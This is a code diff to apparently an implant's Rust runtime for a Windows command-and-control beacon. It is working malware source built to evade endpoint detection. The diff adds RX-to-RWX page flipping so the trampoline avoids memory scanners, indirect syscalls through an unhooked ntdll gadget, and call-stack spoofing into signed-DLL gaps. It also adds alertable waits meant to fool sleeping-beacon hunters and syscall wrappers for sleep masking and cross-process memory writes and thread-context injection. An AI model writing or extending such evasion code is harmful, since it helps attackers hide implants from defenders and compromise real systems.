@@ -29,11 +29,12 @@ pub struct Runtime {
     table: Vec<(String, u32)>,
     /// Absolute address of a `syscall; ret` gadget inside ntdll.
     syscall_gadget: u64,
-    /// A single RWX page used as the indirect-syscall trampoline. The beacon
-    /// loop is single-threaded, so one reusable page is safe and avoids leaking
-    /// a new page per call. (RWX is the simplest W^X-relaxed option here; a
-    /// stricter design would flip RW→RX per call, but that needs VirtualProtect
-    /// on every invocation.)
+    /// A single page used as the indirect-syscall trampoline. The beacon loop
+    /// is single-threaded, so one reusable page is safe. The page is PAGE_RX at
+    /// rest (not RWX — defeats PE-sieve/Moneta unbacked-RWX scans). Before each
+    /// stub write we flip to RWX via kernel32!VirtualProtect, write the stub,
+    /// then flip back to RX. The brief RWX window is transient and much harder
+    /// to fingerprint than a permanent RWX allocation.
     trampoline: *mut u8,
 }
 
@@ -51,7 +52,7 @@ impl Runtime {
         // if it fails (KnownDlls ACL / low IL), behavior is unchanged.
         let mut fresh_guard = FreshMapGuard::default();
         let (table, syscall_gadget) = match crate::unhook::fresh_ntdll_text() {
-            Some((fresh_base, text_rva, text_size)) => {
+            Some((fresh_base, _text_rva, _text_size)) => {
                 // Names/RVAs from the hooked ntdll (intact), bytes from the fresh.
                 let owned: Vec<(String, u32)> = ntdll
                     .exports_iter()
@@ -63,16 +64,16 @@ impl Runtime {
                     exports: &owned,
                 };
                 let t = nyx_evasion::resolve_table(&src);
-                let g = crate::unhook::scan_syscall_gadget_range(fresh_base, text_rva, text_size);
-                fresh_guard.set(fresh_base); // RAII: unmap on drop (after this block)
-                match g {
-                    Some(gadget) => (t, gadget),
-                    None => {
-                        // Gadget not found in fresh .text (shouldn't happen on a
-                        // real ntdll) — fall back to the hooked scan.
-                        (ntdll.resolve_table_owned(), scan_syscall_gadget(&ntdll)?)
-                    }
-                }
+                fresh_guard.set(fresh_base); // RAII: unmap on drop
+                // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
+                // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
+                // absolute address inside it becomes a dangling pointer — every
+                // subsequent indirect syscall would crash with an access violation.
+                // The in-process ntdll's code pages are permanently mapped; EDRs
+                // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
+                // tail (0F 05 C3), so the gadget scan always finds a clean one.
+                let inproc_gadget = scan_syscall_gadget(&ntdll)?;
+                (t, inproc_gadget)
             }
             None => {
                 // KnownDlls mapping failed (ACL / low IL). Before falling back to
@@ -106,7 +107,9 @@ impl Runtime {
         };
         // fresh_guard drops here → unmaps the second ntdll view (transient IOC).
 
-        // One page of executable memory. PAGE_EXECUTE_READWRITE (0x40),
+        // One page of executable memory. Starts PAGE_EXECUTE_READ (0x20) —
+        // defeats PE-sieve/Moneta unbacked-RWX scans. The trampoline_for()
+        // method flips it to RWX briefly for the stub write, then back to RX.
         // MEM_COMMIT|MEM_RESERVE (0x3000). Resolved via the PEB walk.
         let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
         type VirtualAlloc =
@@ -116,7 +119,7 @@ impl Runtime {
             core::ptr::null_mut(),
             0x1000,
             0x3000,
-            0x40, // PAGE_EXECUTE_READWRITE
+            0x20, // PAGE_EXECUTE_READ
         );
         if page.is_null() {
             return None;
@@ -155,6 +158,10 @@ impl Runtime {
     /// typed function pointer to it. Single-threaded (beacon loop only), so no
     /// locking is needed — each call rewrites the same page before invoking.
     ///
+    /// The page is PAGE_RX at rest; this method flips to RWX before the write
+    /// and back to RX after, so the RWX window is transient (~ns). This defeats
+    /// PE-sieve / Moneta scanners that flag permanently RWX private allocations.
+    ///
     /// # Safety
     /// Caller must pass a real SSN resolved from the live ntdll table, and the
     /// pointed-to function must be invoked with arguments matching the target
@@ -162,9 +169,79 @@ impl Runtime {
     /// rcx/rdx/r8/r9, rest on stack).
     pub unsafe fn trampoline_for(&self, ssn: u32) -> *const u8 {
         let stub = indirect_stub(ssn, self.syscall_gadget);
+
+        // W^X flip: RW → RWX → write → RX. Uses kernel32!VirtualProtect
+        // (PEB-resolved) to avoid recursion through the indirect-syscall
+        // trampoline (which is the page we're protecting).
+        //
+        // If VirtualProtect cannot be resolved (kernel32 corrupted/unloaded),
+        // the page stays PAGE_EXECUTE_READ and the copy below would fault.
+        // Bail early — return the trampoline address as-is (stale stub) rather
+        // than crashing with STATUS_ACCESS_VIOLATION.
+        if !unsafe { flip_to_rwx(self.trampoline as usize, stub.len()) } {
+            return self.trampoline as *const u8;
+        }
+
         // The trampoline page is 0x1000 bytes; a stub is ~23. Always fits.
         core::ptr::copy_nonoverlapping(stub.as_ptr(), self.trampoline, stub.len());
+
+        // Best-effort restore to RX. If flip_to_rx fails, the page stays RWX —
+        // not ideal for stealth but not a crash. The alternative (trapping) is
+        // worse for a PIC implant.
+        unsafe { flip_to_rx(self.trampoline as usize, stub.len()); }
+
         self.trampoline as *const u8
+    }
+}
+
+/// Flip the trampoline page (or a region of it) to PAGE_EXECUTE_READWRITE.
+/// Uses kernel32!VirtualProtect resolved via the PEB walk (not the indirect
+/// trampoline — avoids recursion). `addr` is the page base; `len` is the stub
+/// length (VirtualProtect rounds up to a page boundary anyway).
+///
+/// Returns `true` if the page was successfully flipped to RWX, `false` if
+/// VirtualProtect could not be resolved (kernel32 missing/corrupted).
+///
+/// # Safety
+/// `addr` must be the trampoline page address; `len` > 0.
+unsafe fn flip_to_rwx(addr: usize, len: usize) -> bool {
+    let Some(vp) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") else {
+        return false;
+    };
+    type VpFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
+    let f: VpFn = core::mem::transmute(vp);
+    let mut old: u32 = 0;
+    unsafe {
+        f(
+            addr as *mut core::ffi::c_void,
+            len,
+            0x40, // PAGE_EXECUTE_READWRITE
+            &mut old,
+        ) != 0
+    }
+}
+
+/// Flip the trampoline page back to PAGE_EXECUTE_READWRITE → PAGE_EXECUTE_READ
+/// after the stub write. Uses kernel32!VirtualProtect (PEB-resolved).
+///
+/// Returns `true` if the page was successfully flipped to RX.
+///
+/// # Safety
+/// `addr` must be the trampoline page address; `len` > 0.
+unsafe fn flip_to_rx(addr: usize, len: usize) -> bool {
+    let Some(vp) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") else {
+        return false;
+    };
+    type VpFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
+    let f: VpFn = core::mem::transmute(vp);
+    let mut old: u32 = 0;
+    unsafe {
+        f(
+            addr as *mut core::ffi::c_void,
+            len,
+            0x20, // PAGE_EXECUTE_READ
+            &mut old,
+        ) != 0
     }
 }
 
@@ -241,14 +318,41 @@ pub unsafe fn syscall4(
     a4: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    let stub_addr = rt.trampoline_for(ssn);
-    // The stub tail is `jmp r11` (no `ret`), so it returns into *our* caller
-    // via the ntdll `syscall; ret` gadget — meaning the callee is effectively
-    // `extern "system" fn(usize,usize,usize,usize) -> i32` from Rust's POV: the
-    // syscall's own ret pops the return address we pushed. Cast and call.
-    type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
-    let f: Stub = core::mem::transmute(stub_addr);
-    Some(f(a1, a2, a3, a4))
+    // BYOUD-Gap stack spoof: wrap the indirect syscall in spoof_wrap so the
+    // caller's return address resolves to a signed-DLL .pdata gap instead of
+    // an implant address. Degrades to direct call when: no gap pool installed,
+    // swap disabled, or CET active.
+    unsafe { crate::stack::spoof_wrap(|| {
+        let stub_addr = rt.trampoline_for(ssn);
+        type Stub = unsafe extern "system" fn(usize, usize, usize, usize) -> i32;
+        let f: Stub = core::mem::transmute(stub_addr);
+        Some(f(a1, a2, a3, a4))
+    }) }
+}
+
+/// 5-argument indirect syscall (e.g. `NtProtectVirtualMemory`). Same stub as
+/// [`syscall4`]/[`syscall6`]; the 5th arg rides the stack exactly as a native
+/// Win64 call would place it. The trampoline gets cast to a 5-arg fn pointer.
+///
+/// # Safety
+/// Same as [`syscall4`]; a5 must match the target syscall's 5th parameter
+/// (stack-passed per Win64 ABI).
+pub unsafe fn syscall5(
+    rt: &Runtime,
+    name_hash: u32,
+    a1: usize,
+    a2: usize,
+    a3: usize,
+    a4: usize,
+    a5: usize,
+) -> Option<i32> {
+    let ssn = rt.ssn_by_hash(name_hash)?;
+    unsafe { crate::stack::spoof_wrap(|| {
+        let stub_addr = rt.trampoline_for(ssn);
+        type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
+        let f: Stub = core::mem::transmute(stub_addr);
+        Some(f(a1, a2, a3, a4, a5))
+    }) }
 }
 
 /// 6-argument indirect syscall. The indirect stub bytes are identical to the
@@ -271,10 +375,12 @@ pub unsafe fn syscall6(
     a6: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    let stub_addr = rt.trampoline_for(ssn);
-    type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> i32;
-    let f: Stub = core::mem::transmute(stub_addr);
-    Some(f(a1, a2, a3, a4, a5, a6))
+    unsafe { crate::stack::spoof_wrap(|| {
+        let stub_addr = rt.trampoline_for(ssn);
+        type Stub = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> i32;
+        let f: Stub = core::mem::transmute(stub_addr);
+        Some(f(a1, a2, a3, a4, a5, a6))
+    }) }
 }
 
 /// 11-argument indirect syscall. Used for the wide-arity NT file/object APIs
@@ -302,22 +408,15 @@ pub unsafe fn syscall11(
     a11: usize,
 ) -> Option<i32> {
     let ssn = rt.ssn_by_hash(name_hash)?;
-    let stub_addr = rt.trampoline_for(ssn);
-    type Stub = unsafe extern "system" fn(
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-        usize,
-    ) -> i32;
-    let f: Stub = core::mem::transmute(stub_addr);
-    Some(f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
+    unsafe { crate::stack::spoof_wrap(|| {
+        let stub_addr = rt.trampoline_for(ssn);
+        type Stub = unsafe extern "system" fn(
+            usize, usize, usize, usize, usize, usize,
+            usize, usize, usize, usize, usize,
+        ) -> i32;
+        let f: Stub = core::mem::transmute(stub_addr);
+        Some(f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
+    }) }
 }
 
 /// A typed wrapper around an indirect syscall. Resolves the SSN by name hash
@@ -435,13 +534,13 @@ pub unsafe extern "system" fn nyx_selftest_rt_steps() {
     let g = scan_syscall_gadget(&ntdll);
     if g.is_some() {
         step = 0xB3;
-        // 0xB4: trampoline page (VirtualAlloc RWX).
+        // 0xB4: trampoline page (VirtualAlloc RX).
         if let Some(va) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
             type VirtualAlloc = unsafe extern "system" fn(
                 *mut core::ffi::c_void, usize, u32, u32,
             ) -> *mut core::ffi::c_void;
             let f: VirtualAlloc = unsafe { core::mem::transmute(va) };
-            let page = unsafe { f(core::ptr::null_mut(), 0x1000, 0x3000, 0x40) };
+            let page = unsafe { f(core::ptr::null_mut(), 0x1000, 0x3000, 0x20) };
             if !page.is_null() {
                 step = 0xB4;
             }
@@ -612,6 +711,231 @@ pub unsafe fn nt_query_attributes_file(
 /// `NtDelayExecution` — 2 real args (padded into the 4-arg shim).
 pub unsafe fn nt_delay_execution(rt: &Runtime, alertable: u8, delay: usize) -> Option<i32> {
     syscall4(rt, djb2(b"ntdelayexecution"), alertable as usize, delay, 0, 0)
+}
+
+/// `NtWaitForSingleObject(Handle, Alertable, Timeout*)` — 3 real args, padded
+/// into the 4-arg shim. With `Handle = INVALID_HANDLE_VALUE` (-1) and
+/// `Alertable = TRUE`, gives wait-reason `UserRequest` instead of
+/// `DelayExecution`, defeating Hunt-Sleeping-Beacons heuristics. When Alertable
+/// is `FALSE`, this is the standard non-alertable floor-sleep replacement.
+///
+/// # Safety
+/// `timeout` must point at a valid `i64` (100ns units, negative = relative).
+pub unsafe fn nt_wait_for_single_object(
+    rt: &Runtime,
+    handle: usize,
+    alertable: u8,
+    timeout: usize,
+) -> Option<i32> {
+    syscall4(
+        rt,
+        djb2(b"ntwaitforsingleobject"),
+        handle,
+        alertable as usize,
+        timeout,
+        0,
+    )
+}
+
+/// `NtProtectVirtualMemory` — 5 real args: ProcessHandle, BaseAddress* (IN OUT),
+/// RegionSize* (IN OUT), NewAccessMask, OldAccessMask* (OUT). Used by Foliage
+/// (RX↔RW flip) + mem (.text mask). The current-process pseudo-handle
+/// (`0xFFFF_FFFF_FFFF_FFFF`) is passed for ProcessHandle.
+///
+/// # Safety
+/// `base`/`size`/`old_prot` must be valid mutable refs the syscall can write
+/// through; `new_prot` is a PAGE_* constant. Single-threaded beacon context.
+pub unsafe fn nt_protect_virtual_memory(
+    rt: &Runtime,
+    base: &mut usize,
+    size: &mut usize,
+    new_prot: u32,
+    old_prot: &mut u32,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntprotectvirtualmemory"),
+        0xFFFF_FFFF_FFFF_FFFF, // NtCurrentProcess pseudo-handle
+        base as *mut usize as usize,
+        size as *mut usize as usize,
+        new_prot as usize,
+        old_prot as *mut u32 as usize,
+    )
+}
+
+/// `NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
+/// ApcArgument3)` — 5 real args. Used by the Foliage chain to queue `NtContinue`
+/// APCs that walk the sleeping thread through its context dance.
+///
+/// # Safety
+/// `thread` must be a real thread handle with THREAD_SET_CONTEXT access.
+pub unsafe fn nt_queue_apc_thread(
+    rt: &Runtime,
+    thread: usize,
+    apc_routine: usize,
+    arg1: usize,
+    arg2: usize,
+    arg3: usize,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntqueueapcthread"),
+        thread,
+        apc_routine,
+        arg1,
+        arg2,
+        arg3,
+    )
+}
+
+/// `NtContinue(ContextRecord, RaiseAlert)` — 2 real args. Restores a thread's
+/// register state from a CONTEXT struct. The Foliage chain queues APCs that
+/// each call NtContinue to install the next context in the mask→sleep→unmask
+/// dance. 2 args → padded into the 4-arg shim.
+///
+/// # Safety
+/// `ctx` must point at a valid, properly-aligned CONTEXT (1232 bytes on x64).
+pub unsafe fn nt_continue(rt: &Runtime, ctx: usize, raise_alert: u8) -> Option<i32> {
+    syscall4(rt, djb2(b"ntcontinue"), ctx, raise_alert as usize, 0, 0)
+}
+
+/// `NtGetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Captures
+/// the current register state of `thread` into `ctx`. Used by Foliage to save
+/// the original CONTEXT before installing a spoofed one.
+///
+/// # Safety
+/// `ctx` must point at an aligned, writable CONTEXT buffer (1232 bytes on x64).
+pub unsafe fn nt_get_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
+    syscall4(rt, djb2(b"ntgetcontextthread"), thread, ctx, 0, 0)
+}
+
+/// `NtSetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Installs
+/// `ctx` as the register state of `thread`. Used by Foliage to set the spoofed
+/// CONTEXT (RIP = gap address) and later restore the original.
+///
+/// # Safety
+/// `ctx` must point at a valid CONTEXT. Modifying a running thread's RIP/RSP
+/// is inherently dangerous — only call when the thread is known-suspended or
+/// in a controlled APC window.
+pub unsafe fn nt_set_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
+    syscall4(rt, djb2(b"ntsetcontextthread"), thread, ctx, 0, 0)
+}
+
+/// `NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, RegionSize, AllocationType,
+/// Protect)` — 5 real args. Allocates virtual memory in the target process.
+/// Pass `NtCurrentProcess` pseudo-handle (0xFFFF_FFFF_FFFF_FFFF) for
+/// current-process allocations; a real handle for cross-process allocs.
+///
+/// # Safety
+/// `base_out` must point at a valid `usize` the syscall writes the allocated
+/// base address through. `region_size` is IN/OUT (on input: desired size; on
+/// output: actually allocated).
+pub unsafe fn nt_allocate_virtual_memory(
+    rt: &Runtime,
+    process_handle: usize,
+    base_out: &mut usize,
+    region_size: &mut usize,
+    allocation_type: u32,
+    protect: u32,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntallocatevirtualmemory"),
+        process_handle,
+        base_out as *mut usize as usize,
+        region_size as *mut usize as usize,
+        allocation_type as usize,
+        protect as usize,
+    )
+}
+
+/// `NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, Size, Written*)` —
+/// 5 real args. Writes `size` bytes from `buffer` into the target process at
+/// `base`. Returns the number of bytes written in `written`.
+///
+/// # Safety
+/// `buffer` must be readable for `size` bytes; `written` must be a valid `usize`
+/// pointer. `process_handle` must have PROCESS_VM_WRITE access.
+pub unsafe fn nt_write_virtual_memory(
+    rt: &Runtime,
+    process_handle: usize,
+    base_address: usize,
+    buffer: *const u8,
+    size: usize,
+    written: &mut usize,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntwritevirtualmemory"),
+        process_handle,
+        base_address,
+        buffer as usize,
+        size,
+        written as *mut usize as usize,
+    )
+}
+
+/// `NtSuspendThread(ThreadHandle, PreviousSuspendCount*)` — 2 real args. Suspends
+/// the target thread; returns its prior suspend count (or 0xFFFFFFFF on error).
+/// Padded into the 4-arg shim.
+///
+/// # Safety
+/// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
+/// (the output is ignored via padding) or a valid `u32` pointer.
+pub unsafe fn nt_suspend_thread(
+    rt: &Runtime,
+    thread: usize,
+    prev_count: &mut u32,
+) -> Option<i32> {
+    syscall4(
+        rt,
+        djb2(b"ntsuspendthread"),
+        thread,
+        prev_count as *mut u32 as usize,
+        0,
+        0,
+    )
+}
+
+/// `NtResumeThread(ThreadHandle, PreviousSuspendCount*)` — 2 real args. Resumes
+/// a suspended thread. Padded into the 4-arg shim.
+///
+/// # Safety
+/// `thread` must have THREAD_SUSPEND_RESUME access. `prev_count` may be null
+/// (the output is ignored via padding) or a valid `u32` pointer.
+pub unsafe fn nt_resume_thread(
+    rt: &Runtime,
+    thread: usize,
+    prev_count: &mut u32,
+) -> Option<i32> {
+    syscall4(
+        rt,
+        djb2(b"ntresumethread"),
+        thread,
+        prev_count as *mut u32 as usize,
+        0,
+        0,
+    )
+}
+
+/// `NtOpenThread` — opens a handle to a thread by its TID + client ID. Used by
+/// Foliage to get a handle to the current (beacon) thread for APC queuing.
+/// 4 real args (ThreadHandle*, DesiredAccess, ObjectAttrs, ClientId*).
+pub unsafe fn nt_open_thread(
+    rt: &Runtime,
+    handle_out: usize,
+    desired_access: u32,
+    obj_attr: usize,
+    client_id: usize,
+) -> Option<i32> {
+    syscall4(
+        rt,
+        djb2(b"ntopenthread"),
+        handle_out,
+        desired_access as usize,
+        obj_attr,
+        client_id,
+    )
 }
 
 #[cfg(test)]
